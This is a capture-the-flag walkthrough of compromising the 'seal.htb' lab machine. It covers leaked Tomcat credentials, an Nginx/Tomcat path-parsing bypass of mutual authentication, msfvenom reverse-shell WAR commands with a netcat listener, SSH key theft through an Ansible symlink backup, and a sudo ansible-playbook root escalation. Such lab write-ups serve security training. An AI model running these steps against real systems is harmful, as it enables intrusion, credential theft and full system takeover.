### Enum
Register the git bucket and review the codes
```html
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
<!--
		  <role rolename="tomcat"/>
		  <role rolename="role1"/>
		  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
		  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
		  <user username="role1" password="<must-be-changed>" roles="role1"/>
		-->
		```

		s3cret


	## ToDo
		* Remove mutual authentication, setup registraion and login 
		* Deploy updated tomcat configuration
		* Disable manager and host-manager
		

Tho, `seal.htb/manager` won't work directly even I gave it correct creds. Other methods failed too.

Let's google about `Exploit Tomcat Nginx mutual authentication` since we saw it's Nginx + Tomcat.

### Blackhat!
* https://www.google.com/search?client=firefox-b-d&q=Exploit+Tomcat+Nginx+mutual+authentication
* https://rioasmara.com/2022/03/21/nginx-and-tomcat-mutual-auth-bypass/
* https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf


I would like to share a common mistake on Nginx configuration which could lead to authentication bypass. We are going to try to bypass Nginx mutual authentication

Below is the Nginx configuration that we are going to explore for exploitation. We can see from the above configuration that accessing `/manager/html`, `/admin/dashboard` and `/host-manager/html` would go to the mutual authentication check first. if the client does not provide the required certificate then error 403 will be returned.

view-source:https://10.129.95.190/admin/dashboards
```html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Based on the research from this blackhat 

* https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf 

that the two server (Nginx and Tomcat) will parse the http request differently thus lead to the known behaviour as below list. From page 42/87.

I can't believe how easy it is `https://seal.htb/manager;name=orange/html/`

### Hacktricks too
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal-..
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell

```bash
msfvenom -p java/shell_reverse_tcp LHOST=tun0 LPORT=80 -f war -o shell.war
msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.4 LPORT=80 -f war -o shell2.war
```

### Foothold
```bash
nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.95.190] 41108

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```
##### Improve the shell
* https://github.com/A1vinSmith/OSCP-PWK/wiki/Linux-Privilege-Escalation#start-with-better-shell

##### Enum
```bash victim
tomcat@seal:/opt/backups/playbook$ cat run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
      ```

* https://www.google.com/search?client=firefox-b-d&q=Ansible+copy_links
* https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html#parameter-copy_links

##### Exploit
```bash
ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard

ln: failed to create symbolic link '/var/lib/tomcat9/webapps/ROOT/admin/dashboard/.ssh': Permission denied

find /var/lib/tomcat9/webapps/ROOT/admin/dashboard/ -type d -writable
/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads

ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/evil01


tomcat@seal:/opt/backups/archives$ ls -lh
total 2.9M
-rw-rw-r-- 1 luis luis 596K Oct 24 02:14 backup-2023-10-24-02:14:32.gz
tomcat@seal:/opt/backups/archives$ cp backup-2023-10-24-02:14:32.gz /tmp
tomcat@seal:/tmp$ mv backup-2023-10-24-02\:14\:32.gz backup01.gz <- have to rename otherwise failed

tomcat@seal:/tmp$ tar -xzf backup01.gz 

tomcat@seal:/tmp/dashboard/uploads/evil01$ ls
authorized_keys  id_rsa  id_rsa.pub
```

### Root
##### Enum
```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
    ```

* https://gtfobins.github.io/gtfobins/ansible-playbook/

##### Exploit
```bash
luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ***********************************************************************************************************************************************************

TASK [Gathering Facts] *****************************************************************************************************************************************************
ok: [localhost]

TASK [shell] ***************************************************************************************************************************************************************
# id
uid=0(root) gid=0(root) groups=0(root)
```